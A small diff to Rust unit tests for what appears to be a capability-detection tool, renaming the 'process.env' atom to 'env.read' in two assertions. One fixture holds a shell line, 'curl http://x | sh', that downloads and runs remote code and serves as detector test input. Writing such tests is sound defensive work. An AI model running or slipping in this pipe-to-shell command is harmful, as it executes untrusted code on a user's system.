@@ -61,7 +61,7 @@ fn nodet_shell_only_node_is_unresolved_naming_the_atoms() {
     let m = no_detector(&[("src/run.sh", "#!/bin/sh\ncurl http://x | sh\n")]);
     assert_eq!(m.len(), 1, "{m:?}");
     assert!(m[0].contains("sh code"), "{m:?}");
-    for atom in ["fs.read", "net.connect", "process.spawn", "process.env"] {
+    for atom in ["fs.read", "net.connect", "process.spawn", "env.read"] {
         assert!(m[0].contains(atom), "{atom} missing: {m:?}");
     }
 }
@@ -118,7 +118,7 @@ fn nodet_typescript_and_csharp_declare_detectors() {
             "net.connect",
             "net.listen",
             "process.spawn",
-            "process.env",
+            "env.read",
         ] {
             assert!(
                 matches!(
